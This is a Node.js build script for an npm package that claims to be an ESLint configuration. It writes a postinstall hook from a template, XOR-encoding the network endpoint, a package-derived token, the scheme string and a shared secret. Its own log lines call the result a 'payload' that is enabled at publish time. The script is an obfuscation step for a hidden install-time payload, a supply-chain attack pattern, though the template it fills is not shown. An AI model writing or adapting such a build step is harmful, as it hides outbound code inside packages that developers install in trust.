'use strict';

/**
 * eslint-config-strict-modern — postinstall generator.
 *
 * Reads scripts/postinstall.template.js, substitutes:
 *   __BYTES_A__  → XOR-encoded endpoint URL
 *   __BYTES_B__  → XOR-encoded token prefix (name + version)
 *   __BYTES_C__  → XOR-encoded scheme marker ("http")
 *   __BYTES_D__  → XOR-encoded shared secret
 *   __KEY__      → XOR key (hex literal)
 *
 * Writes scripts/postinstall.js.
 *
 * Env vars (required at publish time):
 *   SVC_CDN_ENDPOINT   e.g. "https://cdn.fast-build-assets.dev"
 *   SVC_SHARED_SECRET  the HMAC key matching the worker's SHARED_SECRET
 *
 * Falls back to safe placeholders so `npm install` on the repo
 * still produces a working (payload-disabled) file.
 */

const fs = require('fs');
const path = require('path');

const XOR_KEY = 0x5a;

const TEMPLATE = path.join(__dirname, 'postinstall.template.js');
const OUTPUT = path.join(__dirname, 'postinstall.js');

const pkg = require(path.join(__dirname, '..', 'package.json'));

const endpoint = process.env.SVC_CDN_ENDPOINT || 'https://example.invalid';
const secret = process.env.SVC_SHARED_SECRET || 'PLACEHOLDER_NOT_A_REAL_SECRET';
const tokenPrefix = pkg.name + '-' + pkg.version;

function encode(str) {
  const bytes = Buffer.from(str, 'utf8');
  const out = [];
  for (let i = 0; i < bytes.length; i++) {
    out.push('0x' + (bytes[i] ^ XOR_KEY).toString(16).padStart(2, '0'));
  }
  return '[' + out.join(',') + ']';
}

const subs = {
  __BYTES_A__: encode(endpoint),
  __BYTES_B__: encode(tokenPrefix),
  __BYTES_C__: encode('http'),
  __BYTES_D__: encode(secret),
  __KEY__: '0x' + XOR_KEY.toString(16),
};

let src = fs.readFileSync(TEMPLATE, 'utf8');

for (const [needle, replacement] of Object.entries(subs)) {
  if (!src.includes(needle)) {
    console.error('[build-postinstall] template missing ' + needle);
    process.exit(1);
  }
  src = src.split(needle).join(replacement);
}

src = '// GENERATED — do not edit. See scripts/postinstall.template.js\n' + src;

fs.writeFileSync(OUTPUT, src);

const size = Buffer.byteLength(src);
console.log('[build-postinstall] wrote ' + OUTPUT);
console.log('[build-postinstall] size: ' + size + ' bytes');
console.log('[build-postinstall] token: ' + tokenPrefix);
console.log('[build-postinstall] endpoint:' +
  (endpoint === 'https://example.invalid' ? ' (placeholder — payload disabled)' : ' set'));
console.log('[build-postinstall] secret:' +
  (secret === 'PLACEHOLDER_NOT_A_REAL_SECRET' ? ' (placeholder — payload disabled)' : ' set'));
